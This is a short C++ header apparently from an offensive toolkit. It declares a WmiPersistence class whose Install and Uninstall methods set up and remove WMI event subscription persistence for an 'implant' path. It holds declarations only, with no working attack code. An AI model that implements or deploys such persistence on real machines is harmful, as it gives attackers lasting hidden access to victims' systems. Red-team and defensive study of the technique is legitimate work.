#pragma once
#include <windows.h>
#include <string>

namespace persistence {

class WmiPersistence {
public:
    // Installs WMI event subscription persistence
    static bool Install(const std::string& implantPath, const std::string& taskName);

    // Uninstalls the WMI event subscription
    static bool Uninstall(const std::string& taskName);

private:
    static std::wstring GetExecutablePath();
};

} // namespace persistence
